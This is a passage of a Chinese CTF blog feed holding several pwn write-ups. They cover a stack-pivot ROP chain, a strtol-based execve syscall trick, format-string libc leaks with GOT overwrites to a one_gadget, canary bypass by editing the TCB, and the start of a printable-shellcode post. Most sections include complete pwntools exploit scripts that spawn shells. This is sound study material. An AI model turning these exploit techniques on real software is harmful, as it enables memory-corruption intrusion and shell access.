p64(ret_addr)+p64(rsi_r15_addr)+p64(0x4040f0+0x28*i)+p64(0x4040f0+0x28*i)+p64(read_addr) io.send(payload)payload = p64(ret_addr)+p64(ret_addr)+p64(rdi_addr)+p64(0x4040a0)+p64(system_addr)io.send(payload)io.interactive() 另外再借助猫神的exp以其他做法复现了一遍 收获也很大 记录一下 我觉得十分有必要逐步分析 首先 我们的栈空间不够 所以需要往高地址写入rop链再迁移过去 这是最开始的思路 起初我是认为第二次main函数的read的rsi参数被破坏了 这是因为我用的是垃圾数据覆盖rbp 在复现第二题的时候意识到了这个问题 而其rsi寄存器的值实际上是取rbp-0x20处的数据 .text:000000000040121A mov edx, 30h ; &#x27;0&#x27; ; nbytes.text:000000000040121F mov rsi, rax ; buf.text:0000000000401222 mov edi, 0 ; fd.text:0000000000401227 call _read 所以如果我们适当调整rbp的值 这里的read就可以做到任意写 我们预想的情况还是在bss段上通过连续的rop链来牢牢掌握住程序控制流 pad0 = b&quot;a&quot;*0x20+p64(0x4040c0+0x20)+p64(0x401216) 这一段payload用来供第一次main函数的第一个read函数读入 用来覆盖rbp的0x4040c0这个可以先忽略 在实际做题中暂且认为其是一个变量 值为0x4040a0+len(payload) 此处的payload为第一次main函数第二次read读入的rop链长度 此时程序执行到了第二次read这里 读入的首地址是0x4040a0 read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) gdb动调查看各个寄存器的值 发现我们只需要修改rsi寄存器的值就可以构造read函数 读入的地址挑选一个高地址处的 抬高栈帧 接下来 程序继续运行 跳转到了0x401216 再次执行一次read 但是要注意在栈帧结束时的leave指令 此时使得rbp指向了0x4040e0 于是我们这时候执行的read参数为 p64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret) 这一段payload主要是用来进行栈迁移到高地址处 通过弹出0x4048d8给rbp寄存器 leave_ret将栈迁移到了0x4048d8 接着程序执行流执行到了第二次main函数的第二次read read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) 这个read读入的首地址仍然是0x4040a0 所以和第一次main读入一样的数据就行了 随后 第二次main函数准备结束栈帧 执行leave|ret两条指令 mov rsp,rbp rsp指向0x4040e8 rbp指向0x404098 还记得我们之前往0x4040c0写入的rop链吗 此刻派上用场了 位于0x4040e8的正是leave指令 执行完leave以后 rbp为0 rsp为0x4040a0 此刻程序执行流来到了我们最初往0x4040a0写入的rop链 其再次构造了一次read 这个read读入地址的首地址为0x4048d8 rop_sh = p64(0x4048d8)+p64(pop_rdi)+p64(0x4048f8)+p64(system_plt)+b&#x27;/bin/sh&#x27;+p64(0) 此时程序执行到read函数结束 准备ret到下一个字长处的指令 那么此时就是pop rbp 接着往下一个字长处是leave_ret 相当于一个栈迁移 而此时0x4040c8处我们填充的就是0x4048d8 而0x4048d8处我们填充的也是0x4048d8 所以rsp和rbp此时就完成了一次栈迁移 rsp指向了构造的system 到这里整个程序的执行流就结束了 不过还是没有理解的地方 按理来说 read_rop = p64(pop_rsi_r15)+p64(0x4048d8)+p64(0)read_rop += p64(read_plt)+p64(pop_rbp) 中的pop_rbp和下面的 p64(pop_rbp)+p64(0x4048d8)+p64(leave_ret)+p64(0)+p64(0x4040a0-8)+p64(leave_ret) 中的pop_rbp所存储的是同一个内存空间 都是0x4040c0 不知道为啥删去前面一个就会导致程序卡死 问题貌似出在这一段rop链错位了 0x4040c0应该存放的是pop rbp 而0x4040c8不应该为0 而是存放0x4048d8 这个疑点目前以我的动调水平还看不出来是啥问题 留着以后探讨吧 不过这次复现真的提升很大 对于栈迁移更加熟悉了 特别是学会了利用pop rbp的方法来栈迁移 不得不说和猫神这样的大牛子差距真的太大了 tongxunlu考的就是一个函数的返回值在寄存器存放中的知识点 在这题之前我们先来看一个小程序 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, buf, 0x30uLL); puts(&quot;pause&quot;); return 0;&#125; 调式exp: from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()payload = cyclic(0x8)gdb.attach(io,&#x27;b *$rebase(0x72C)&#x27;)pause()io.send(payload)pause() 将断点打在call read之后 随后我们来看一下寄存器的值 可以看到此时rax寄存器的值是0x8 正是我们通过read输入的数据的字节数 而read函数的返回值则等于接收到的字节数 同理 我们来试一下strtol函数 即本题的关键漏洞函数 #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;seccomp.h&gt;#include&lt;string.h&gt;int main()&#123; char a[20]; long int b; read(0,a,0x30); b= strtol(a,0,10); puts(&quot;pause&quot;);&#125; from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./a.out&quot;)context.log_level = &quot;debug&quot;#elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)#libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()payload = b&#x27;11&#x27;+b&#x27;aaaaaaaa&#x27;gdb.attach(io,&#x27;b *$rebase(0x77D)&#x27;)pause(0)io.send(payload)pause() 可以看到11是被rax寄存器存储 aaaaaaaa 被rdi寄存器存储 strtol函数一共需要三个参数 long int strtol(const char *str, char **endptr, int base) str字符串提供要经过转化的字符串 endptr用来存放剩余字符串 base用来指定转化的进制 就**strtol(a,0,10)**举例 我们给定的进制为10进制 那么其只会接收0-9的字符 如果检测到了不属于这个范围的 则会停止接收 比如读入了两个11后 检测到了a 则停止接收 使返回值为11 而接下来剩余的字符串 会一直接收到识别到\\x00 即字符串的结束 将其放入到endptr中 在这个程序中的表现就是被放入到rdi寄存器存储 上述的一切程序编译环境是Ubuntu18.04 更换libc为libc-2.31.so 说回vn的这一题 保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled RUNPATH: &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27; 再来看一下反汇编后的代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; init_buf(argc, argv, envp); eeee_wantboy(); hao_kang_de(); return 0;&#125; 三个函数 init_buf用来清空缓存区 来看剩下两个 __int64 eeee_wantboy()&#123; char v1[256]; // [rsp+0h] [rbp-130h] BYREF char buf[36]; // [rsp+100h] [rbp-30h] BYREF int v3; // [rsp+128h] [rbp-8h] int v4; // [rsp+12Ch] [rbp-4h] v4 = 0; v3 = 0; puts(&quot;halo little giegie,my name is eeee,i am 11111&quot;); puts(&quot;can i get your phone number&quot;); puts(&quot;if you give me your number,i will give you some hao_kang_de&quot;); read(0, buf, 0x40uLL); printf(&quot;i get you ! little giegie&quot;); printf(&quot;heyhey , hao_kang_de is %lx \\n&quot;, v1); puts(&quot;anything want to say?&quot;); read(0, v1, 0x100uLL); return strtol(buf, 0LL, 10);&#125; 有一个栈溢出漏洞 但是只够覆盖rbp和retaddr 不过前面一题是栈迁移 应该不会两题都考 还有一次往v1输入数据的机会 不过没有栈溢出 也覆盖不到buf 最后是调用了strtol函数 联想到我们上面做的小实验 所以这里我们可以控制rax和rdi寄存器的值 接着看下一个函数 int hao_kang_de()&#123; signed __int64 v0; // rax puts(&quot;wait!! i will give you something&quot;); v0 = sys_write(0, 0LL, 0LL); return puts(&quot;hhhh~i just tell a joke&quot;);&#125; 转化成汇编形式 .text:000000000000087B push rbp.text:000000000000087C mov rbp, rsp.text:000000000000087F lea rdi, s ; &quot;wait!! i will give you something&quot;.text:0000000000000886 call _puts.text:000000000000088B mov rax, 1.text:0000000000000892 mov rdi, 0 ; fd.text:0000000000000899 mov rsi, 0 ; buf.text:00000000000008A0 mov rdx, 0 ; count.text:00000000000008A7 syscall ; LINUX - sys_write.text:00000000000008A9 lea rdi, aHhhhIJustTellA ; &quot;hhhh~i just tell a joke&quot;.text:00000000000008B0 call _puts.text:00000000000008B5 nop.text:00000000000008B6 pop rbp.text:00000000000008B7 retn 是采用syscall的方法调用的write 联想到我们可以修改rax和rdi 所以这里可以直接partical write的方法跳转到0x899这里 进行系统调用 完整exp: from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def exploit(): io=process(&#x27;./pwn&#x27;) io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;) payload = b&#x27;59&#x27;+b&#x27;/bin/sh\\x00&#x27; payload += cyclic(0x2e)+p16(0x899) io.send(payload) io.recvuntil(&quot;anything want to say?&quot;) payload = p64(0) # gdb.attach(io,&#x27;b *$rebase(0x976)&#x27;) # pause(0) io.send(payload) # pause() io.sendline(&quot;cat flag&quot;) result = io.recv(timeout=1) io.interactive()if __name__ == &#x27;__main__&#x27;: try_count = 0 while(True): try: exploit() except: try_count += 1 print(&quot;failed :&#123;&#125;&quot;.format(try_count)) 这题还看到其他师傅有比较新奇的思路 用的是格式化字符串泄露libc基址 试着跟着复现了一下 感觉收获还是很多的 因为这题开启了PIE 所以没有办法利用第一个栈溢出到处跑 只能说试着爆破最后两个字节或者是覆盖最后一个字节来做到同页内迁移 正常情况下eeee_wantboy函数的返回地址是 如果我们只覆盖最后一个字节就可以做到同页内的迁移 可以跳转到0x555555554900 - 0x555555554a00的任意地址 也就是eeee_wantboy函数的一部分和main函数 原本的程序执行顺序是先read再提供栈的地址 通过跳转的办法我们就可以获得栈地址后再考虑如何构造rop链 同时你要注意到read函数的rsi参数是根据rbp的地址来寻找的 .text:0000000000000943 lea rax, [rbp+var_130].text:000000000000094A mov edx, 100h ; nbytes.text:000000000000094F mov rsi, rax ; buf.text:0000000000000952 mov edi, 0 ; fd.text:0000000000000957 call _read 如果用垃圾数据覆盖rbp 就丢失了这次read的机会 这里把漏洞点放到没有指定任何参数 而是单独输出字符串的printf函数上面 我们只需要控制rdi寄存器就可以触发格式化字符串漏洞 这里也是借助strtol函数的特性来操控rdi寄存器 from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)pause(0)io.send(b&#x27;chen&#x27;)pause() 这里的rbp之所以用stack_addr+0x218覆盖 也是为了使得第二次执行eeee函数时的read的rsi参数正确 我们预想的是直接写到rsp处 这样在执行read指令时 其内部存在的ret指令就可以将rop链的首部弹出到rip 控制程序执行流 这个偏移并不是唯一的 可以自己更换数值多动调 按我下面的办法 此时rsp是指向0x7ffc8d148b50处 而我们的rbp设置成了stack_addr+0x218 为0x7ffc8d148c28 所以read读入的地址是rbp-0x130 也就是0x7ffc8d148af8 此时s进入call read指令 当其执行到ret准备执行下一个指令时的rsp指针指向0x7ffc8d148b48 所以我们read需要填充的垃圾数据就是0x7ffc8d148b48-0x7ffc8d148af8&#x3D;0x50 另外执行system的时候还需要注意栈对齐 完整exp: from pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)# gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)# pause(0)io.send(b&#x27;chen&#x27;)libc_start_main_addr = int(io.recvuntil(&quot;|&quot;,drop = True),16)-243success(&quot;libc_start_main_addr :&quot;+hex(libc_start_main_addr))elf_base = int(io.recv(14),16)-0x978success(&quot;elf_base :&quot;+hex(elf_base))libc_addr = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rdi_addr = elf_base + 0x0000000000000a13io.recvuntil(&quot;anything want to say?&quot;)ret_addr = elf_base + 0x000000000000069epayload = b&#x27;a&#x27;*0x50+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"修改TCB来绕过canary","slug":"修改TCB来绕过canary","date":"2023-02-17T12:54:29.000Z","updated":"2023-09-14T17:18:28.000Z","comments":true,"path":"2023/02/17/修改TCB来绕过canary/","link":"","permalink":"http://example.com/2023/02/17/%E4%BF%AE%E6%94%B9TCB%E6%9D%A5%E7%BB%95%E8%BF%87canary/","excerpt":"","text":"以往做过的开启了canary保护的题目 一般都是通过格式化字符串泄露 从而来绕过canary 最近在学习免杀的时候 意外了解了canary的生成机制 从而就有了今天的这一篇文章 总体下来还是收获颇丰 什么是canary由于c语言并没有检查数组的下标 所以其存在溢出的可能性 诱发了栈溢出漏洞 可以使得攻击者任意的控制程序执行流 对此 canary机制有效预防了栈溢出的操作 其通过在栈帧的bp寄存器间隔一个字长(往低地址方向)的地方存放了一串随机数(末位为\\x00 目的是防止被printf等函数泄露) 在函数结束前 进行了一个异或检查 如果发现此地址处的canary被修改了 那么则判定为发生了栈溢出的行为 则会跳转到**___stack_chk_fail**函数 该函数负责输出错误信息并且终止程序 函数栈帧在形成初期 从 fs:0x28 赋值 并将其入栈 函数结束前进行异或判定 如果结尾为0 就通过jz指令跳转到 leave|ret 指令处返回父栈帧 否则就调用**___stack_chk_fail**函数结束程序 而在libc2.23及以下的版本中 ___stack_chk_fail函数会根据argv[0]存放的程序路径来输出下面这样的错误信息 #include&lt;stdio.h&gt;int main()&#123; char a[0x20]; read(0,a,0x30);&#125; 而argv[0]位于当前栈帧的栈底 可以通过溢出篡改其为flag 从而获取flag 这里直接在源码中修改argv[0] 看看效果 #include&lt;stdio.h&gt;int main(int argc,char **argv)&#123; char a[20]; argv[0]=&quot;hello,world&quot;; read(0,a,0x30);&#125; 不过 要注意的是 其输出的是路径 也就是字符串 而非输出该路径对应文件的内容 接着我们更换一下libc 文件 使其为libc2.27再次尝试 源码不变 可以发现其直接默认输出unknown了 同时这里发现了一个有趣的现象 到达一定长度后 溢出的数据会被当作指令执行 这就需要进一步研究了 不过由于我实在是太心急把这篇文章写出来 所以暂时是先咕咕了 后续会开一个新篇章研究这个现象 上述稍微跑题了一下 说回canary 栈上的canary是由 fs:28h 处提供的值 我们对这个地址朔源一下 fs是一个寄存器 其指向当前活动线程的TEB结构 TEB是一个线程环境块 进程中每个线程都对应着一个TEB结构体 其存储了线程的各种信息 不同的偏移对应着不同的信息 000 指向SEH链指针004 线程堆栈顶部008 线程堆栈底部00C SubSystemTib010 FiberData014 ArbitraryUserPointer018 FS段寄存器在内存中的镜像地址020 进程PID024 线程ID02C 指向线程局部存储指针030 PEB结构地址（进程结构）034 上个错误号 但是fs中存放的TEB地址需要经过解析之后才能显示 调用pthread_self函数就可以获取到TEB的位置 可以在对应位置找到canary 而canary判断是否被更改 是将栈上的和这里的进行比较 如果我们修改了TEB上的canary 那么栈上的canary就可以很轻易的被我们绕过 那么TEB上的canary又是从何而来呢 这就要从内核的_dl_random说起了 其是一个地址 用来指向内核中存储随机数的地方 该随机数初始化于动态链接之前 其存放于auxiliary vector 数组中 该数组是用来辅助程序运行的数据数组 其在dl_main函数中被调用 ElfW(Addr)_dl_sysdep_start (void **start_argptr, void (*dl_main) (const ElfW(Phdr) *phdr, ElfW(Word) phnum, ElfW(Addr) *user_entry, ElfW(auxv_t) *auxv))&#123; ... DL_FIND_ARG_COMPONENTS (start_argptr, _dl_argc, _dl_argv, _environ, GLRO(dl_auxv)); for (av = GLRO(dl_auxv); av-&gt;a_type != AT_NULL; set_seen (av++)) ... case AT_RANDOM: _dl_random = (void *) av-&gt;a_un.a_val; break; ... ...&#125; 接着是__libc_start_main函数 其生成canary的源码如下 // sysdeps\\unix\\sysv\\linux\\dl-osinfo.hstatic inline uintptr_t __attribute__ ((always_inline))_dl_setup_stack_chk_guard (void *dl_random)&#123; union &#123; uintptr_t num; unsigned char bytes[sizeof (uintptr_t)]; &#125; ret; /* We need in the moment only 8 bytes on 32-bit platforms and 16 bytes on 64-bit platforms. Therefore we can use the data directly and not use the kernel-provided data to seed a PRNG. */ memcpy (ret.bytes, dl_random, sizeof (ret));#if BYTE_ORDER == LITTLE_ENDIAN ret.num &amp;= ~(uintptr_t) 0xff;#elif BYTE_ORDER == BIG_ENDIAN ret.num &amp;= ~((uintptr_t) 0xff &lt;&lt; (8 * (sizeof (ret) - 1)));#else# error &quot;BYTE_ORDER unknown&quot;#endif return ret.num;&#125; canary的值和dl_random一致 只不过在最后一个字节强制使其为\\x00 接着来到_libc_start_init函数 /* Set up the stack checker&#x27;s canary. */ uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD THREAD_SET_STACK_GUARD (stack_chk_guard);# else __stack_chk_guard = stack_chk_guard;# endif 如果设置了THREAD_SET_STACK_GUARD宏 那么canary就会被设置进入线程局部存储 PS:一直没有搞清楚TEB TCB pthread三者的关系 上述的描述可能存在很大问题 更详细的源码级别可以看这篇博客 以我的水平很难对其进行复述 浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog 在gdb中我们修改其值为0 接下一路n到函数结束前的canary判断 此时只要rcx寄存器中的值与fs:0x28中的值相同 就会触发je指令 正常结束栈帧 但是显然 此时rcx寄存器保存的是在函数最开始入栈的旧canary值 而此时fs:0x28处的值已经被我们修改为0 如果此时进行xor 显然结果是不会为0 我们再次更改一下rcx寄存器的值 并且执行这一步异或 此时eflags寄存器的值为 其二进制形式为1001000110 ZF标志位是1 那么jz指令就会跳转 于是就不会触发__stack_chk_fail函数 所以我们成功绕过了canary 上述的绕过是基于修改主TCB中的canary 还有一种办法是修改子线程的TCB 这里不做说明 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"axb_2019_fmt64","slug":"axb-2019-fmt64","date":"2023-02-15T14:38:29.000Z","updated":"2023-09-14T17:18:40.000Z","comments":true,"path":"2023/02/15/axb-2019-fmt64/","link":"","permalink":"http://example.com/2023/02/15/axb-2019-fmt64/","excerpt":"","text":"这题收获还是很大的 学会了自己构造任意写的格式化字符串漏洞payload checksec看一下保护机制 [!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida查看一下反汇编代码 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char s[272]; // [rsp+10h] [rbp-250h] BYREF char format[312]; // [rsp+120h] [rbp-140h] BYREF unsigned __int64 v5; // [rsp+258h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); setbuf(stdin, 0LL); setbuf(stderr, 0LL); puts( &quot;Hello,I am a computer Repeater updated.\\n&quot; &quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;); puts(&quot;So I&#x27;ll answer whatever you say!&quot;); while ( 1 ) &#123; alarm(3u); memset(s, 0, 0x101uLL); memset(format, 0, 0x12CuLL); printf(&quot;Please tell me:&quot;); read(0, s, 0x100uLL); sprintf(format, &quot;Repeater:%s\\n&quot;, s); if ( (unsigned int)strlen(format) &gt; 0x10E ) break; printf(format); &#125; printf(&quot;what you input is really long!&quot;); exit(0);&#125; 很常规的64位格式化字符串 但是多了个函数alarm 限制了进程持续的时间 如果我们使用pwntools内置的函数fmtstr_payload来生成payload的话 会由于字节过多发送失败 所以这里尝试一下自己构造 from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr)) 泄露libc基址很简单 只要注意一下64位的p64会附带\\x00 导致printf读取到后直接截断了 无法正常泄露 得把p64放在后面 接下来的难点在于说如何任意地址写 这题要获取shell的办法无非就是覆盖函数的got表 修改为system 随后参数设置为&#x2F;bin&#x2F;sh 或者是onegadget 而格式化字符串任意写是依靠%x$n 这个格式符是将其前面输出的字节赋值到对应的偏移地址 如果我们想要任意写的只是小额的数值 我们可以这样构造payload payload = b&#x27;a&#x27;*padding+b&#x27;%$xn&#x27;+p64(ptr_addr)# 其中padding是想要修改的数值 x是varge参数的偏移 但是如果我们想要赋值onegadget到exit函数的got表 那么可想而知 需要庞大的字节数 不仅仅题目很少会给我们无限制的读入数据 如此庞大的数据还会导致程序运行缓慢 何况这题还调用了alarm函数 那么换个想法 如果我们只是修改单字节或者是双字节呢? 因为每个函数的真实地址差别只在于最后几个字节 前面的都是一样的 这样就可以大大减少需要的字节数 对于一个地址来说 其在内存一共占用了8个字节 而每个字节都存放着相应的数值 比如说下图 0x7f7458560971处的内容就是0x55 我们对比一下got表中存放的真实地址 发现只有后5位是不一样的 不过由于没有办法单独修改1位 所以我们需要修改后三个字节的数据 我们知道在n前面添加一个h就可以减半要操作的字节数 %$xhhn就可以做到修改单字节的数据 所以只能修改2的倍数的字节 要想修改三个字节的话 我们需要修改两次 一次修改单字节 一次修改双字节 接下来还有一个问题在于 函数的真实地址每次程序运行的时候都会变化 我们肉眼当然是可以读出地址的后三位 但是要如何利用脚本来实现读取呢? 这里介绍一下算术右移和与运算 算术右移: 对于一个二进制数 例如11110000来说 其符号位为1 如果是逻辑右移的话 不需要考虑符号位 而算术右移 如果符号位是1的话 就需要用1来补全 反之 用0来补全 比如算术右移3 那么这个二进制数就会变成 (1)(1)(1)11110 括号的表示是补全的 与运算: 二进制数a 10101010 二进制数b 11111111 二者进行与运算的话 对应的位依次进行比较 如果两个位都是1的话 那么与运算之后的结果就是1 除此之外的所有情况 与运算后的结果都是0 那么a和b与运算后的结果就是 10101010 与运算的作用在于 如果我们是和0xff来与运算 其二进制数是11111111 就会保留与之运算的数的最后一个字节的值 比如: system_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 00000000 00000000 00000000 00000000 11111111 11111111 0xffff# 00000000 00000000 00000000 00000000 00000100 00100000 0x0420 用system_addr去和0xffff与运算 最后得到的结果就是0x0420 为system_addr的最后两个字节 如果再用上算术右移 那么我们就可以获取到倒数第三个字节的值 system_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 11111111 11111111 11111111 10110110 00001111 11100100 system_addr &gt;&gt; 16# 00000000 00000000 00000000 00000000 00000000 11111111 0xff# 00000000 00000000 00000000 00000000 00000000 11100100 0xe4 最后得到的值就是system_addr的倒数第三个字节 至于输出足够的字节来使%n读取到从而任意写 则是采用%c这个格式化字符 其作用是输出x个字节 如果不够则用\\x00补齐 比如 printf(“%10c”) 就会输出10个空字符 那么最后的payload就是这样构造 payload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got) %n是在其之前输出了多少字节的字符就将对应值赋给对应的地址 而在这一题中 先行输出了 “Repeater:” 所以需要-9 而encode()则是在python3中需要发送byte型的数据 所以需要进行转化 随后的low_addr-high_addr也是同理 完整exp: from pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr))io.recvuntil(&quot;Please tell me:&quot;)printf_got = elf.got[&#x27;printf&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_got = elf.got[&#x27;alarm&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_addr = libc_addr + libc.sym[&#x27;alarm&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]#7a4420onegadget_addr = libc_addr + 0xf02a4high_addr = (onegadget_addr&gt;&gt;16)&amp;0xfflow_addr = onegadget_addr&amp;0xffffpayload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got)io.sendline(payload)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(b&#x27;aaaa&#x27;)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"可见字符shellcode","slug":"可见字符shellcode","date":"2023-02-11T13:18:37.000Z","updated":"2023-09-14T17:18:20.000Z","comments":true,"path":"2023/02/11/可见字符shellcode/","link":"","permalink":"http://example.com/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/","excerpt":"","text":"利用pwntools自带的shellcraft生成的shellcode 所消耗的字节数比较多 并且还含有很多的不可见字符 from pwn import*context.arch = &quot;amd64&quot;io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;shellcode = asm(shellcraft.sh())io.send(shellcode) 有些题目会对症下药 限制shellcode长度的题目已经屡见不鲜 本篇文章来讲一下限制字符范围的shellcode 国际上普遍采用ascii码作为字符的编码 其中规定了95个可见字符 即打印字符 可以被直接输出 剩下的则是不可见的字符 而pwn题中的可见字符shellcode通常指使用可见字符构成的shellcode 这里我们需要借用alpha3这款工具来将一串不可见的字符shellcode转化为可见字符 手动转化的办法这里就不介绍了 毕竟我也不会 哪天学会了再补充吧 由于官方的alpha3只支持win32 在linux系统中会出现报错 